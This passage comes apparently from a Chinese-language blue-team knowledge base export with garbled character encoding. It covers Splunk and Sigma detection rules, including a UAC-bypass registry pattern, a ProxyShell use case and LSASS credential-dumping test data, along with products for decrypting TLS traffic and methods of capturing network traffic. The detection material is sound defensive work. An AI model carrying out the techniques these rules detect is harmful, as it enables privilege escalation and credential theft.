'PSEXESVC*'\r\n      condition: selection1 and not selection2\r\n  falsepositives:\r\n      - nothing observed so far\r\n  level: high\r\n```\r\n\r\n# 4. é¡¹ç›®åœ°å€\r\n- [https://github.com/SigmaHQ/sigma](https://github.com/SigmaHQ/sigma)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/Blue Teamèƒ½åŠ›å»ºè®¾/å¨èƒæ£€æµ‹è§„åˆ™/Splunk Rules/","title":"Splunk Rules"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: Splunk Rules\r\ntags:\r\n- Blue Teamèƒ½åŠ›å»ºè®¾\r\n- å¨èƒæ£€æµ‹è§„åˆ™\r\n- Splunk\r\n---\r\n\r\n# 1. ä»‹ç»\r\nSplunkæä¾›æ˜ å°„åˆ°ATT&CK/KILL CHAIN/CIS Controls TTPsç›¸å…³çš„USE CASEå’Œæ£€æµ‹è§„åˆ™ï¼Œ å®ƒä»¬åŒ…æ‹¬æ£€æµ‹è§„åˆ™ã€æœç´¢è¯­æ³•ã€æœºå™¨å­¦ä¹ ç®—æ³•å’Œ Splunk Phantom å‰§æœ¬â€”â€”æ‰€æœ‰è¿™äº›éƒ½æ—¨åœ¨ååŒå·¥ä½œä»¥æ£€æµ‹ã€è°ƒæŸ¥å’Œå“åº”å¨èƒã€‚\r\n\r\n# 2. è¦†ç›–èŒƒå›´\r\nè¦æŸ¥çœ‹ä½¿ç”¨ATT&CKæ ‡è®°çš„æ‰€æœ‰å†…å®¹çš„æœ€æ–°æ£€æµ‹è¦†ç›–å›¾ï¼Œè¯·è®¿é—®ï¼š[https://mitremap.splunkresearch.com](https://mitremap.splunkresearch.com) åŒ…å«ç›®å‰æ£€æµ‹è¦†ç›–èŒƒå›´çš„æŠ€æœ¯çš„å¿«ç…§ã€‚ è“è‰²çš„é˜´å½±è¶Šæ·±ï¼Œå¯¹è¿™ç§ç‰¹å®šæŠ€æœ¯çš„æ£€æµ‹å°±è¶Šå¤šï¼›è¯¥åœ°å›¾åœ¨æ¯æ¬¡å‘å¸ƒæ—¶è‡ªåŠ¨æ›´æ–°ï¼Œå¹¶ä» generate-coverage-map.py ç”Ÿæˆã€‚\r\n\r\n# 3. æ£€æµ‹è§„åˆ™\r\nåŒ…å«äº†ç»ˆç«¯ã€ç½‘ç»œå’Œäº‘ç›¸å…³çš„200å¤šç§æ£€æµ‹è§„åˆ™ï¼Œç¤ºä¾‹å¦‚ä¸‹:\r\n\r\n```\r\n  name: Eventvwr UAC Bypass\r\n  id: 9cf8fe08-7ad8-11eb-9819-acde48001122\r\n  version: 1\r\n  date: '2021-03-01'\r\n  author: Michael Haag, Splunk\r\n  type: TTP\r\n  datamodel:\r\n  - Endpoint\r\n  description: The following search identifies Eventvwr bypass by identifying the registry\r\n    modification into a specific path that eventvwr.msc looks to (but is not valid)\r\n    upon execution. A successful attack will include a suspicious command to be executed\r\n    upon eventvwr.msc loading. Upon triage, review the parallel processes that have\r\n    executed. Identify any additional registry modifications on the endpoint that may\r\n    look suspicious. Remediate as necessary.\r\n  search: '| tstats `security_content_summariesonly` count values(Registry.registry_key_name)\r\n    as registry_key_name values(Registry.registry_path) as registry_path min(_time)\r\n    as firstTime max(_time) as lastTime FROM datamodel=Endpoint.Registry where  Registry.registry_path=\"*mscfile\\\\shell\\\\open\\\\command\\\\*\"  by\r\n    Registry.user, Registry.dest , Registry.registry_value_name| `security_content_ctime(lastTime)`\r\n    | `security_content_ctime(firstTime)` | `drop_dm_object_name(Registry)` | `eventvwr_uac_bypass_filter`'\r\n  how_to_implement: To successfully implement this search you need to be ingesting information\r\n    on process that include the name of the process responsible for the changes from\r\n    your endpoints into the `Endpoint` datamodel in the `Registry` node.\r\n  known_false_positives: Some false positives may be present and will need to be filtered.\r\n  references:\r\n  - https://blog.malwarebytes.com/malwarebytes-news/2021/02/lazyscripter-from-empire-to-double-rat/\r\n  - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.md\r\n  - https://attack.mitre.org/techniques/T1548/002\r\n  - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\r\n  tags:\r\n    analytic_story:\r\n    - Windows Defense Evasion Tactics\r\n    - IcedID\r\n    automated_detection_testing: passed\r\n    confidence: 100\r\n    context:\r\n    - Source:Endpoint\r\n    - Stage:Defense Evasion\r\n    dataset:\r\n    - https://media.githubusercontent.com/media/splunk/attack_data/master/datasets/attack_techniques/T1548.002/atomic_red_team/windows-sysmon.log\r\n    impact: 80\r\n    kill_chain_phases:\r\n    - Exploitation\r\n    - Privilege Escalation\r\n    message: Registry values were modified to bypass UAC using Event Viewer on $dest$\r\n      by $user$.\r\n    mitre_attack_id:\r\n    - T1548.002\r\n    - T1548\r\n    observable:\r\n    - name: user\r\n      type: User\r\n      role:\r\n      - Victim\r\n    - name: dest\r\n      type: Hostname\r\n      role:\r\n      - Victim\r\n    product:\r\n    - Splunk Enterprise\r\n    - Splunk Enterprise Security\r\n    - Splunk Cloud\r\n    required_fields:\r\n    - _time\r\n    - Registry.registry_key_name\r\n    - Registry.registry_path\r\n    - Registry.user\r\n    - Registry.dest\r\n    - Registry.registry_value_name\r\n    risk_score: 80\r\n    security_domain: endpoint\r\n```\r\n\r\nå®Œæ•´å†…å®¹è§ï¼š\r\n  - [https://github.com/splunk/security_content/tree/develop/detections](https://github.com/splunk/security_content/tree/develop/detections)\r\n\r\n# 4. USE CASEs\r\n- ProxyShellçš„ç¤ºä¾‹å¦‚ä¸‹:\r\n\r\n  ```\r\n    name: ProxyShell\r\n    id: 413bb68e-04e2-11ec-a835-acde48001122\r\n    version: 1\r\n    date: '2021-08-24'\r\n    author: Michael Haag, Teoderick Contreras, Mauricio Velazco, Splunk\r\n    type: batch\r\n    description: ProxyShell is a chain of exploits targeting on-premise Microsoft Exchange Server - CVE-2021-34473, CVE-2021-34523, and CVE-2021-31207.\r\n    narrative: 'During Pwn2Own April 2021, a security researcher demonstrated an attack chain targeting on-premise Microsoft Exchange Server. August 5th, the same researcher publicly released further details and demonstrated the attack chain. \\\r\n      1. CVE-2021-34473 - Pre-auth path confusion leads to ACL Bypass (Patched in April by KB5001779) \\\r\n      1. CVE-2021-34523 - Elevation of privilege on Exchange PowerShell backend (Patched in April by KB5001779) \\\r\n      1. CVE-2021-31207 - Post-auth Arbitrary-File-Write leads to RCE (Patched in May by KB5003435) \\\r\n      Upon successful exploitation, the remote attacker will have `SYSTEM` privileges on the Exchange Server. In addition to remote access/execution, the adversary may be able to run Exchange PowerShell Cmdlets to perform further actions.'\r\n    references:\r\n      - https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/\r\n      - https://www.zerodayinitiative.com/blog/2021/8/17/from-pwn2own-2021-a-new-attack-surface-on-microsoft-exchange-proxyshell\r\n      - https://www.youtube.com/watch?v=FC6iHw258RI\r\n      - https://www.huntress.com/blog/rapid-response-microsoft-exchange-servers-still-vulnerable-to-proxyshell-exploit#what-should-you-do\r\n      - https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-ProxyLogon-Is-Just-The-Tip-Of-The-Iceberg-A-New-Attack-Surface-On-Microsoft-Exchange-Server.pdf\r\n    tags:\r\n      analytic_story:\r\n      - ProxyShell\r\n      category:\r\n      - Adversary Tactics\r\n      - Ransomware\r\n      product:\r\n      - Splunk Enterprise\r\n      - Splunk Enterprise Security\r\n      - Splunk Cloud\r\n      usecase: Advanced Threat Detection\r\n  ```\r\n\r\n# 5. æ”»å‡»æ ·æœ¬æ•°æ® Attack Data Repository\r\n- æ— éœ€å‡†å¤‡æ”»å‡»ç¯å¢ƒ/å·¥å…·ï¼Œ å¿«é€ŸéªŒè¯æ£€æµ‹è§„åˆ™çš„è¦†ç›–å’Œæœ‰æ•ˆæ€§ã€‚\r\n- æ•°æ®ä½¿ç”¨YMLï¼Œæ ¼å¼å¦‚ä¸‹ï¼š\r\n\r\n| å­—æ®µ        | æè¿°             |\r\n| ----------- | ---------------- |\r\n| id          | å”¯ä¸€æ ‡è¯†UUID     |\r\n| name        | ä½œè€…åç§°         |\r\n| date        | æœ€åä¿®æ”¹æ—¥æœŸ     |\r\n| dataset     | datasetå…³è”URLs  |\r\n| description | ç®€ä»‹             |\r\n| environment | è¿è¡Œç¯å¢ƒ         |\r\n| technique   | å¯¹åº”çš„ATT&CKæ‰‹æ³• |\r\n| references  | å‚è€ƒä¿¡æ¯         |\r\n| sourcetypes | æ¥æºç±»å‹         |\r\n\r\nç¤ºä¾‹å¦‚ä¸‹:\r\n\r\n```\r\nid: 405d5889-16c7-42e3-8865-1485d7a5b2b6\r\nauthor: Patrick Bareiss\r\ndate: '2020-10-08'\r\ndescription: 'Atomic Test Results: Successful Execution of test T1003.001-1 Windows\r\nCredential Editor Successful Execution of test T1003.001-2 Dump LSASS.exe Memory\r\nusing ProcDump Return value unclear for test T1003.001-3 Dump LSASS.exe Memory using\r\ncomsvcs.dll Successful Execution of test T1003.001-4 Dump LSASS.exe Memory using\r\ndirect system calls and API unhooking Return value unclear for test T1003.001-6\r\nOffline Credential Theft With Mimikatz Return value unclear for test T1003.001-7\r\nLSASS read with pypykatz '\r\nenvironment: attack_range\r\ntechnique:\r\n- T1003.001\r\ndataset:\r\n- https://media.githubusercontent.com/media/splunk/attack_data/master/datasets/attack_techniques/T1003.001/atomic_red_team/windows-powershell.log\r\n- https://media.githubusercontent.com/media/splunk/attack_data/master/datasets/attack_techniques/T1003.001/atomic_red_team/windows-security.log\r\n- https://media.githubusercontent.com/media/splunk/attack_data/master/datasets/attack_techniques/T1003.001/atomic_red_team/windows-sysmon.log\r\n- https://media.githubusercontent.com/media/splunk/attack_data/master/datasets/attack_techniques/T1003.001/atomic_red_team/windows-system.log\r\nreferences:\r\n- https://attack.mitre.org/techniques/T1003/001/\r\n- https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md\r\n- https://github.com/splunk/security-content/blob/develop/tests/T1003_001.yml\r\nsourcetypes:\r\n- XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\r\n- WinEventLog:Microsoft-Windows-PowerShell/Operational\r\n- WinEventLog:System\r\n- WinEventLog:Security\r\n```\r\n\r\n# 6. å‚è€ƒèµ„æ–™\r\n- [https://github.com/splunk/attack_data](https://github.com/splunk/attack_data)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/Blue TeamåŸºç¡€è®¾æ–½/ç½‘ç»œåŸºç¡€è®¾æ–½/åŠ å¯†æµé‡è§£å†³æ–¹æ¡ˆ/","title":"åŠ å¯†æµé‡è§£å†³æ–¹æ¡ˆ"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: åŠ å¯†æµé‡è§£å†³æ–¹æ¡ˆ\r\ntags:\r\n  - Blue TeamåŸºç¡€è®¾æ–½\r\n  - ç½‘ç»œåŸºç¡€è®¾æ–½\r\n  - åŠ å¯†æµé‡\r\n  - è¡Œä¸šå®è·µ\r\n  - Palo Alto Networks\r\n  - Extrahop\r\n  - Gigamon\r\n  - Google\r\n---\r\n\r\n# 1. åŸºç¡€çŸ¥è¯†\r\n**X.509 è¯ä¹¦ï¼š** è¯ä¹¦åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´å»ºç«‹ä¿¡ä»»ä»¥å»ºç«‹ SSL è¿æ¥ï¼Œå°è¯•å¯¹æœåŠ¡å™¨è¿›è¡Œèº«ä»½éªŒè¯ï¼ˆæˆ–å¯¹å®¢æˆ·ç«¯è¿›è¡Œèº«ä»½éªŒè¯çš„æœåŠ¡å™¨ï¼‰çš„å®¢æˆ·ç«¯çŸ¥é“ X.509 è¯ä¹¦çš„ç»“æ„ï¼Œå› æ­¤çŸ¥é“å¦‚ä½•ä»è¯ä¹¦ä¸­çš„å­—æ®µä¸­æå–æœ‰å…³æœåŠ¡å™¨çš„æ ‡è¯†ä¿¡æ¯ï¼Œä¾‹å¦‚ FQDN æˆ– IP åœ°å€ï¼ˆç§°ä¸ºè¯ä¹¦ä¸­çš„é€šç”¨åç§°æˆ–CNï¼‰æˆ–é¢å‘è¯ä¹¦çš„ç»„ç»‡ã€éƒ¨é—¨æˆ–ç”¨æˆ·çš„åç§°ã€‚è¯ä¹¦é¢å‘æœºæ„ (CA) å¿…é¡»é¢å‘æ‰€æœ‰è¯ä¹¦ã€‚CA éªŒè¯å®¢æˆ·ç«¯æˆ–æœåŠ¡å™¨åï¼ŒCA é¢å‘è¯ä¹¦å¹¶ä½¿ç”¨ç§é’¥å¯¹å…¶è¿›è¡Œç­¾åã€‚\r\n\r\n# 2. [[Palo Alto Networks]] Solution\r\n**è§£å¯†ç­–ç•¥ï¼š** é˜²ç«å¢™å¿…é¡»åœ¨å…¶è¯ä¹¦ä¿¡ä»»åˆ—è¡¨ (CTL) ä¸­æ‹¥æœ‰æœåŠ¡å™¨æ ¹ CA è¯ä¹¦ï¼Œå¹¶ä½¿ç”¨è¯¥æ ¹ CA è¯ä¹¦ä¸­åŒ…å«çš„å…¬é’¥æ¥éªŒè¯ç­¾åï¼Œç„¶åé˜²ç«å¢™æä¾›ä¸€ä»½ç”±è½¬å‘ä¿¡ä»»è¯ä¹¦ç­¾åçš„æœåŠ¡å™¨è¯ä¹¦çš„å‰¯æœ¬ï¼Œä¾›å®¢æˆ·ç«¯è¿›è¡Œèº«ä»½éªŒè¯ã€‚\r\n- **Outbound SSL trafficï¼šSSL Forward Proxy**\r\n  - é˜²ç«å¢™æ˜¯å†…éƒ¨å®¢æˆ·ç«¯å’Œå¤–éƒ¨æœåŠ¡å™¨ä¹‹é—´çš„ä¸­é—´äººã€‚é˜²ç«å¢™ä½¿ç”¨è¯ä¹¦å°†å®¢æˆ·ç«¯é€æ˜åœ°è¡¨ç¤ºç»™æœåŠ¡å™¨ï¼Œå¹¶å°†æœåŠ¡å™¨é€æ˜åœ°è¡¨ç¤ºç»™å®¢æˆ·ç«¯ï¼Œè¿™æ ·å®¢æˆ·ç«¯å°±è®¤ä¸ºå®ƒæ˜¯ç›´æ¥ä¸æœåŠ¡å™¨é€šä¿¡çš„ï¼ˆå³ä½¿å®¢æˆ·ç«¯ä¼šè¯æ˜¯ä¸é˜²ç«å¢™è¿›è¡Œçš„ï¼‰ï¼ŒæœåŠ¡å™¨ä¹Ÿç›¸ä¿¡å®ƒç›´æ¥ä¸å®¢æˆ·ç«¯é€šä¿¡ï¼ˆå³ä½¿æœåŠ¡å™¨ä¼šè¯ä¹Ÿä¸é˜²ç«å¢™ï¼‰ã€‚é˜²ç«å¢™ä½¿ç”¨è¯ä¹¦å°†è‡ªå·±å»ºç«‹ä¸ºå®¢æˆ·ç«¯-æœåŠ¡å™¨ä¼šè¯çš„å¯ä¿¡ç¬¬ä¸‰æ–¹ï¼ˆä¸­é—´äººï¼‰ã€‚\r\n  - ![dsbk1w](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2022-12/dsbk1w.jpg)\r\n- **Inbound SSL trafficï¼šSSL Inbound Inspection**\r\n  - ä¸ºè¦æ‰§è¡Œ SSL å…¥ç«™æ£€æŸ¥çš„æ¯å°æœåŠ¡å™¨å®‰è£…è¯ä¹¦å’Œç§é’¥ã€‚æ‚¨è¿˜å¿…é¡»åœ¨æ¯ä¸ªæ‰§è¡Œ SSL å…¥ç«™æ£€æŸ¥çš„é˜²ç«å¢™ä¸Šå®‰è£…å…¬é’¥è¯ä¹¦å’Œç§é’¥ã€‚é˜²ç«å¢™æ‰§è¡Œ SSL å…¥ç«™æ£€æŸ¥çš„æ–¹å¼å–å†³äºåå•†çš„å¯†é’¥ç±»å‹ã€Rivestã€Shamirã€Adleman (RSA) æˆ– Perfect Forward Secrecy ( PFS )ã€‚\r\n  - ![SNxlAy](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2022-12/SNxlAy.jpg)\r\n- **Tunneled SSH trafficï¼šSSH Proxy**\r\n  - åœ¨ SSH ä»£ç†é…ç½®ä¸­ï¼Œé˜²ç«å¢™ä½äºå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´ã€‚SSH ä»£ç†ä½¿é˜²ç«å¢™èƒ½å¤Ÿè§£å¯†å…¥ç«™å’Œå‡ºç«™ SSH è¿æ¥ï¼Œå¹¶ç¡®ä¿æ”»å‡»è€…ä¸ä¼šä½¿ç”¨ SSH å¯¹ä¸éœ€è¦çš„åº”ç”¨ç¨‹åºå’Œå†…å®¹è¿›è¡Œéš§é“ä¼ è¾“ã€‚SSH è§£å¯†ä¸éœ€è¦è¯ä¹¦ï¼Œé˜²ç«å¢™åœ¨å¯åŠ¨æ—¶ä¼šè‡ªåŠ¨ç”Ÿæˆç”¨äº SSH è§£å¯†çš„å¯†é’¥ã€‚åœ¨å¯åŠ¨è¿‡ç¨‹ä¸­ï¼Œé˜²ç«å¢™ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ç°æœ‰å¯†é’¥ã€‚å¦‚æœæ²¡æœ‰ï¼Œé˜²ç«å¢™ä¼šç”Ÿæˆä¸€ä¸ªå¯†é’¥ã€‚é˜²ç«å¢™ä½¿ç”¨å¯†é’¥è§£å¯†é˜²ç«å¢™ä¸Šé…ç½®çš„æ‰€æœ‰è™šæ‹Ÿç³»ç»Ÿçš„ SSH ä¼šè¯å’Œæ‰€æœ‰ SSH v2 ä¼šè¯ã€‚\r\n\r\n# 3. [[Extrahop]] Solution\r\n**TLS 1.3å‘å±•å¸¦æ¥çš„é—®é¢˜ï¼šPerfect Forward Secrecy**\r\n- ä»¥å‰ç‰ˆæœ¬çš„ TLSï¼šä½¿ç”¨é™æ€DHå¯†é’¥äº¤æ¢ç®—æ³•å¾ˆå®¹æ˜“è§£å¯†ã€‚\r\n- TLS1.3(PFS) ä½¿ç”¨ ECDHE(Elliptic Curve Diffie-Hellman Encryption å¯†é’¥åå•†ç®—æ³•ï¼Œæ¡æ‰‹è¿‡ç¨‹ä¸­å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯éƒ½éœ€è¦ä¸´æ—¶ç”Ÿæˆæ¤­åœ†æ›²çº¿å…¬ç§é’¥ï¼Œè¿™æ ·å³ä½¿ä¼šè¯å¯†é’¥è¢«æ³„éœ²ï¼Œä¹Ÿæ— æ³•è§£å¯†æ‰€æœ‰ä¼šè¯ã€‚\r\nè§£å†³æ–¹æ¡ˆï¼š\r\n- **ä¸­é—´äººåŠ«æŒï¼š** ä¸²è¡Œæ–¹æ¡ˆï¼Œè§£å¯†ï¼Œåˆ†æï¼Œç„¶åé‡æ–°åŠ å¯†ä¼ è¾“\r\n- **å¸¦å¤–ç›‘æ§ä¸è§£å¯†ï¼š** å¹¶è¡Œæ–¹æ¡ˆï¼Œæµé‡é•œåƒå®ç°\r\n\r\n\r\n**ExtraHop Reveal(x)ä½¿ç”¨å¸¦å¤–è§£å¯†æ–¹æ¡ˆ**\r\n- æ•°æ®è·å–ï¼šReveal(x) ä½¿ç”¨ Microsoft Azure vTAP æˆ– Amazon VPC æµé‡é•œåƒæ¥è·å–æ•°æ®åŒ…ã€‚\r\n- éšç§ä¿æŠ¤ï¼šéµå¾ªHIPAA, PCI, SOX, GDPRç­‰æ³•æ¡ˆï¼Œå®¢æˆ·éœ€è¦è‡ªå·±é€‰æ‹©è¦è§£å¯†çš„æµé‡ã€‚\r\n- TLS1.3æ–¹æ¡ˆï¼šExtraHop Reveal(x) ä½¿ç”¨è½»é‡çº§çš„agentè·å–æ¯ä¸ªä¼šè¯çš„ä¸´æ—¶ä¼šè¯å¯†é’¥ï¼Œè¯¥agentéœ€è¦å®‰è£…è¦è§£å¯†çš„æ¯å°æœåŠ¡å™¨ä¸Šï¼›agenté€šè¿‡ PFS åŠ å¯†é€šé“å°†è§£å¯†åçš„ä¼šè¯å®‰å…¨åœ°ä¼ è¾“åˆ° ExtraHop Reveal(x) è®¾å¤‡ï¼Œåœ¨é‚£é‡Œå®ƒä»¬è¢«å®‰å…¨å­˜å‚¨å¹¶ä¸”åªæœ‰å…·æœ‰æœ€é«˜ç®¡ç†æƒé™çš„ç”¨æˆ·æ‰èƒ½è®¿é—®ã€‚\r\n- ![wfT2AN](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2022-12/wfT2AN.jpg)\r\n\r\n# 4. [[Gigamon]] Solution\r\n![7UduQ4](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2022-12/7UduQ4.jpg)\r\n\r\n- **å…¥ç«™åŠ å¯†æµé‡ï¼š** è¯ä¹¦æ‰˜ç®¡\r\n- **å‡ºç«™åŠ å¯†æµé‡ï¼š** ä¸­é—´äººåŠ«æŒï¼ˆæœ¬åœ°ä¿¡ä»»CAï¼‰\r\n\r\n![DaE7NT](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2022-12/DaE7NT.jpg)\r\n\r\n# 5. [[Google]] Cloud IDS Solution\r\n\r\nåˆšä¸Šçº¿ä¸ä¹…ï¼Œå¯èƒ½è¿˜æœªè€ƒè™‘åˆ°åŠ å¯†æµé‡çš„æƒ…å†µ\r\n\r\n![b9GRnf](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2022-12/b9GRnf.jpg)\r\n\r\n# 6. å‚è€ƒèµ„æ–™\r\n\r\n- [https://docs.paloaltonetworks.com/pan-os/9-1/pan-os-admin/decryption/decryption-overview](https://docs.paloaltonetworks.com/pan-os/9-1/pan-os-admin/decryption/decryption-overview)\r\n- [https://www.extrahop.com/products/cloud/how-it-works](https://www.extrahop.com/products/cloud/how-it-works)\r\n- [http://blog.nsfocus.net/east-west-flow-sum](http://blog.nsfocus.net/east-west-flow-sum)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/Blue TeamåŸºç¡€è®¾æ–½/ç½‘ç»œåŸºç¡€è®¾æ–½/ç½‘ç»œæµé‡é‡‡é›†æ–¹æ¡ˆ/","title":"ç½‘ç»œæµé‡é‡‡é›†æ–¹æ¡ˆ"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: ç½‘ç»œæµé‡é‡‡é›†æ–¹æ¡ˆ\r\ntags:\r\n- Blue TeamåŸºç¡€è®¾æ–½\r\n- ç½‘ç»œåŸºç¡€è®¾æ–½\r\n- è¡Œä¸šå®è·µ\r\n- Gigamon\r\n---\r\n\r\n# 1. åŸºç¡€çŸ¥è¯†\r\nä¸¤ç§æœ€å¸¸è§çš„ç½‘ç»œæµé‡é‡‡é›†æ–¹æ³•æ˜¯ç½‘ç»œåˆ†è·¯å™¨(TAPs) å’Œäº¤æ¢æœºç«¯å£é•œåƒ(SPANs):\r\n**1.1. ç½‘ç»œåˆ†è·¯å™¨(TAPs)**\r\nä¸€ç§ç›´æ¥è¿æ¥åˆ°ç½‘ç»œåŸºç¡€è®¾æ–½çš„ç‰©ç†è®¾å¤‡ã€‚ TAP ä½äºä¸¤ä¸ªè®¾å¤‡ä¹‹é—´ï¼Œè€Œä¸æ˜¯ä¸¤ä¸ªäº¤æ¢æœºæˆ–è·¯ç”±å™¨ä¹‹é—´ï¼›å¹¶è¡Œæ–¹æ¡ˆï¼Œé€šè¿‡æ‹·è´æµé‡å‰¯æœ¬è¿›è¡Œç›‘æ§ï¼Œä¸å½±å“åŸå§‹ç½‘ç»œé€šè®¯ï¼Œè¿™ç§æŠ€æœ¯ç¡®ä¿ä»»ä½•å¤§å°çš„æ•°æ®åŒ…éƒ½å°†è¢«æ‹·è´å¹¶ä¸”**ä¸å®¹æ˜“è¶…è½½**ã€‚\r\nå¦‚ä¸‹å›¾æ‰€ç¤ºï¼ŒWebæœåŠ¡å™¨å’Œäº¤æ¢æœºä¹‹é—´çš„æµé‡æ•°æ®è¢«TAPè®¾å¤‡æ•è·æ‹·è´(TxA:A->B, TxB:B->A)ï¼Œå¤§å¤šæ•°TAPè®¾å¤‡åˆ†åˆ«å¤åˆ¶ä¸¤ä¸ªæ–¹å‘çš„æµé‡æ•°æ®ï¼Œå¹¶å°†å®ƒä»¬å‘é€åˆ°å•ç‹¬çš„ç›‘æ§ç«¯å£ï¼ˆTxAå’ŒTxBï¼‰\r\n![qTtJbp](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2022-12/qTtJbp.jpg)\r\n\r\n**1.2. äº¤æ¢æœºç«¯å£é•œåƒ(SPANs)**\r\nSPAN ç«¯å£ï¼ˆæœ‰æ—¶ç§°ä¸ºé•œåƒç«¯å£ï¼‰æ˜¯ä¸€ç§å†…ç½®äºäº¤æ¢æœºæˆ–è·¯ç”±å™¨çš„è½¯ä»¶åŠŸèƒ½ï¼Œå¯æ‹·è´é€šè¿‡è®¾å¤‡çš„é€‰å®šæµé‡æ•°æ®åŒ…çš„å‰¯æœ¬ï¼Œå¹¶å°†å®ƒä»¬å‘é€åˆ°æŒ‡å®šçš„ SPAN ç«¯å£ã€‚ ç”±äºäº¤æ¢æœºæˆ–è·¯ç”±å™¨çš„ä¸»è¦ç›®çš„æ˜¯è½¬å‘ç”Ÿäº§æ•°æ®åŒ…ï¼Œå› æ­¤ SPAN æ•°æ®åœ¨è®¾å¤‡ä¸Šçš„ä¼˜å…ˆçº§è¾ƒä½ï¼ŒSPAN è¿˜ä½¿ç”¨å•ä¸ªå‡ºå£ç«¯å£æ¥èšåˆå¤šä¸ªé“¾è·¯ï¼Œå› æ­¤**å¾ˆå®¹æ˜“è¶…è½½**ã€‚SPAN æœ€é€‚åˆåœ¨æœªå®‰è£… TAP çš„ä½ç½®å¯¹å°‘é‡æ•°æ®è¿›è¡Œä¸´æ—¶ç›‘æ§ã€‚ï¼ˆæ³¨ï¼šSPAN ä»ç„¶æ˜¯è®¿é—®æŸäº›ç±»å‹æ•°æ®çš„å”¯ä¸€æ–¹å¼ï¼Œä¾‹å¦‚åœ¨åŒä¸€äº¤æ¢æœºä¸Šè·¨ç«¯å£åˆ°ç«¯å£çš„æ•°æ®ï¼‰\r\n\r\n![xKSTiK](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2022-12/xKSTiK.jpg)\r\n\r\n# 2. ä¸œè¥¿å‘æµé‡é‡‡é›†\r\nä¼ ç»ŸTAPå’ŒSPANçš„æ–¹æ¡ˆåœ¨ä¸œè¥¿å‘æµé‡é‡‡é›†æœ‰ä¸¤ä¸ªéš¾ç‚¹ï¼š**1ã€æ— æ³•é‡‡é›†åŒä¸€å®¿ä¸»æœºå†…çš„ä¸¤å°è™šæ‹Ÿæœºä¹‹é—´çš„æµé‡ã€‚2ã€å°è£…äº†vxlanç­‰éš§é“åŒ…å¤´çš„æ•°æ®æµé‡æ— æ³•è¯†åˆ«**ã€‚\r\n\r\nä¸šç•Œä¸»æµçš„æ–¹æ¡ˆæœ‰ï¼ˆTAP/SPANçš„åŸºç¡€ä¸Šï¼‰ï¼š\r\n- SDNï¼šé€šè¿‡SDNæ§åˆ¶å™¨çš„å…¨ç½‘æ§åˆ¶èƒ½åŠ›ï¼Œå®ç°ä¸œè¥¿å‘æµé‡é‡‡é›†\r\n- APIæ¥å£ï¼šé€šè¿‡è°ƒç”¨äº‘è®¡ç®—ç³»ç»Ÿçš„æ ‡å‡†å¼•æµAPIï¼Œå®ç°ä¸œè¥¿å‘æµé‡é‡‡é›†\r\n- ä»£ç†ï¼šéSDNç½‘ç»œä¸‹ï¼Œæ·»åŠ ä¸€ä¸ªå¼•æµçš„ä»£ç†ï¼Œå®ç°ä¸œè¥¿å‘æµé‡é‡‡é›†\r\n- Agentï¼šé€šè¿‡åœ¨ç»ˆç«¯éƒ¨ç½²è½¯ä»¶æ¥å®ç°ä¸œè¥¿å‘æµé‡é‡‡é›†\r\n- vxlanï¼šåœ¨è™šæœºä¸Šåšé•œåƒï¼ŒæŠŠæµé‡é€šè¿‡vxlanå¯¼å‡ºå»ï¼Œé€åˆ°ä¸€å°æ”¯æŒvxlanç»ˆç»“çš„äº¤æ¢æœºä¸Šå»ï¼Œè¿™å°äº¤æ¢æœºæŠŠvxlanå‰¥ç¦»åï¼Œé€ç»™æ—æŒ‚çš„è®¾å¤‡è¿›è¡Œæµé‡é‡‡é›†\r\n\r\n# 3. Gigamon Solution\r\n- **æ— æºTAP**\r\n  - æ— æºTAPæ˜¯åœ¨å…¶ç½‘ç»œç«¯å£ä¹‹é—´æ²¡æœ‰ç‰©ç†éš”ç¦»çš„è®¾å¤‡ï¼Œå®ƒä»ç½‘ç»œçš„ä¸¤ä¸ªæ–¹å‘æ¥æ”¶æµé‡ï¼Œä»¥ä¾¿åœ¨ç›‘è§†å·¥å…·ä¸Šçœ‹åˆ°100ï¼…çš„æµé‡ã€‚æ— æºTAPä¸éœ€è¦ä»»ä½•ç”µæºï¼Œå¢åŠ äº†ä¸€å±‚å†—ä½™ï¼Œå‡ ä¹ä¸éœ€è¦ç»´æŠ¤ï¼Œå¹¶å‡å°‘äº†æ€»è´¹ç”¨ã€‚\r\n- **æœ‰æºTAP**\r\n  - æœ‰æºTAPåœ¨ç½‘ç»œç«¯å£ä¹‹é—´å…·æœ‰ç‰©ç†éš”ç¦»ã€‚å› æ­¤ï¼Œå®ƒä»¬éœ€è¦ä¸€ç§æ•…éšœå®‰å…¨æœºåˆ¶ï¼Œä»¥ç¡®ä¿åœ¨TAPæ–­ç”µæ—¶ç½‘ç»œä¿æŒå¯æ“ä½œçŠ¶æ€ï¼›**æœ‰æºTAPé€šå¸¸åœ¨ä¸‹é¢çš„åœºæ™¯ä½¿ç”¨ï¼ˆæ— æºTAPä¸é€‚ç”¨ï¼‰**ï¼š\r\n    1. Locations where the light levels are too low to use a splitter â†’ regeneration provides a viable solution\r\n    2. Copper infrastructures 